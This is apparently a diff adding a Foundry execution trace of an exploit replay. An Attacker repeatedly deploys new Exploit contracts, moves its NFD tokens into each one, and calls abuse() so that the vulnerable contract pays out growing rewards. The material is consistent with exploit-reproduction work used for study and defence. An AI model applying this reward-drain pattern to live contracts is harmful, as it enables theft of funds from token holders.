+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], value: 6256944747384865288311100 [6.256e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 81460607576529880772820593 [8.146e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 81460607576529880772820593 [8.146e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 81460607576529880772820500 [8.146e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 81460607576529880772820593 [8.146e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], 81460607576529880772820593 [8.146e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], value: 81460607576529880772820500 [8.146e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 81460607576529880772820592 [8.146e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], 6777522550367286080298673 [6.777e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], value: 6777522550367286080298600 [6.777e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 88238130126897166853119265 [8.823e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 88238130126897166853119265 [8.823e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x8227724C33C1748A42d1C1cD06e21AB8Deb6eB0A], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 88238130126897166853119200 [8.823e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 88238130126897166853119265 [8.823e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], 88238130126897166853119265 [8.823e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], value: 88238130126897166853119200 [8.823e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 88238130126897166853119264 [8.823e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], 7341412426557844282179522 [7.341e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], value: 7341412426557844282179500 [7.341e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 95579542553455011135298786 [9.557e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 95579542553455011135298786 [9.557e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x883816205341a6ba3C32AE8dAdCEbDD9d59BC2C4], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 95579542553455011135298700 [9.557e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xe916cadb12C49389E487eB1e8194B1459b29B0eC
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 95579542553455011135298786 [9.557e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], 95579542553455011135298786 [9.557e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], value: 95579542553455011135298700 [9.557e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 95579542553455011135298785 [9.557e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], 7952217940447456926456858 [7.952e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], value: 7952217940447456926456800 [7.952e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 103531760493902468061755643 [1.035e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 103531760493902468061755643 [1.035e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xe916cadb12C49389E487eB1e8194B1459b29B0eC], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 103531760493902468061755600 [1.035e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x83898D1F3C03189fF03B471dd3456908FCA4423d
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 103531760493902468061755643 [1.035e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], 103531760493902468061755643 [1.035e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], value: 103531760493902468061755600 [1.035e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 103531760493902468061755642 [1.035e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], 8613842473092685342738069 [8.613e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], value: 8613842473092685342738000 [8.613e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 112145602966995153404493711 [1.121e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 112145602966995153404493711 [1.121e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x83898D1F3C03189fF03B471dd3456908FCA4423d], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 112145602966995153404493700 [1.121e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 112145602966995153404493711 [1.121e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], 112145602966995153404493711 [1.121e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], value: 112145602966995153404493700 [1.121e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 112145602966995153404493710 [1.121e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], 9330514166853996763253876 [9.33e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], value: 9330514166853996763253800 [9.33e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 121476117133849150167747586 [1.214e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 121476117133849150167747586 [1.214e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x6AFc743aa4E9D98D0F53Ff111996E9817d79D301], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 121476117133849150167747500 [1.214e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 121476117133849150167747586 [1.214e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], 121476117133849150167747586 [1.214e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], value: 121476117133849150167747500 [1.214e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 121476117133849150167747585 [1.214e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], 10106812945536249293956599 [1.01e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], value: 10106812945536249293956500 [1.01e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 131582930079385399461704184 [1.315e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 131582930079385399461704184 [1.315e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x3450a15Dc9cbDD5C0e28cC22474D88AD7e2695A3], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 131582930079385399461704100 [1.315e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 131582930079385399461704184 [1.315e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], 131582930079385399461704184 [1.315e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], value: 131582930079385399461704100 [1.315e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 131582930079385399461704183 [1.315e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], 10947699782604865235213788 [1.094e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], value: 10947699782604865235213700 [1.094e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 142530629861990264696917971 [1.425e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 142530629861990264696917971 [1.425e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xE194aA6b80fFd71989dd196c7f84fa624b8d7D5d], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 142530629861990264696917900 [1.425e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 142530629861990264696917971 [1.425e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], 142530629861990264696917971 [1.425e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], value: 142530629861990264696917900 [1.425e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 142530629861990264696917970 [1.425e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], 11858548404517590022783575 [1.185e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], value: 11858548404517590022783500 [1.185e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 154389178266507854719701545 [1.543e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 154389178266507854719701545 [1.543e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x98E53ecDDd253E5A7f845a713D7fc8853CF47EDE], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 154389178266507854719701500 [1.543e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x688B74D1C43f65C2236A81bdaADF85671Dfe8072
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 154389178266507854719701545 [1.543e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072], 154389178266507854719701545 [1.543e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072], value: 154389178266507854719701500 [1.543e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 154389178266507854719701544 [1.543e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072], 12845179631773453512679168 [1.284e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072], value: 12845179631773453512679100 [1.284e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 167234357898281308232380712 [1.672e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 167234357898281308232380712 [1.672e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x688B74D1C43f65C2236A81bdaADF85671Dfe8072], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 167234357898281308232380700 [1.672e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xe98c2E73E40560f5795a62f67e479927Af573340
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 167234357898281308232380712 [1.672e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340], 167234357898281308232380712 [1.672e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340], value: 167234357898281308232380700 [1.672e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 167234357898281308232380711 [1.672e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340], 13913898577137004844934075 [1.391e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340], value: 13913898577137004844934000 [1.391e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 181148256475418313077314786 [1.811e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 181148256475418313077314786 [1.811e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xe98c2E73E40560f5795a62f67e479927Af573340], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 181148256475418313077314700 [1.811e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 181148256475418313077314786 [1.811e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A], 181148256475418313077314786 [1.811e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A], value: 181148256475418313077314700 [1.811e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 181148256475418313077314785 [1.811e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A], 15071534938754803648032590 [1.507e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A], value: 15071534938754803648032500 [1.507e25])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 196219791414173116725347375 [1.962e26]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 196219791414173116725347375 [1.962e26])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x6C1Df8ffb37dC4e5059A335DDA7c5F3e5Be8CC2A], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 196219791414173116725347300 [1.962e26])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 196219791414173116725347375 [1.962e26]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA], 196219791414173116725347375 [1.962e26])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA], value: 196219791414173116725347300 [1.962e26])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 196219791414173116725347375 [1.962e26]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA], 16325486645659203311548901 [1.632e25])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x75C00fE81f8C251ffCE676f63E9db4a71a29F6DA], value: 16325486645659203311548900 [1.632e25])
+    │   │   │   │   │   │   └─ ← [Return] true
